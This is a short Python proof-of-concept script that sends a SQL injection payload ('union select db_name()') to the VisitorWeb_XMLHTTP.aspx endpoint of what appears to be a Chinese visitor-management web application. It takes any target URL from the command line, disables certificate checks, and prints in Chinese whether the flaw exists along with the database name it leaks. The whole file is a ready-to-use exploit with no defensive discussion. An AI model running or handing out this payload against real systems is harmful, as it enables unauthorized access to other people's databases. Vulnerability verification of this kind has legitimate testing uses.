#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=1'+union+select+db_name()--+z"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if r.status_code == 200:
        return r.text
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取到的数据名称为：", info)
    else:
        print("[-]漏洞不存在")
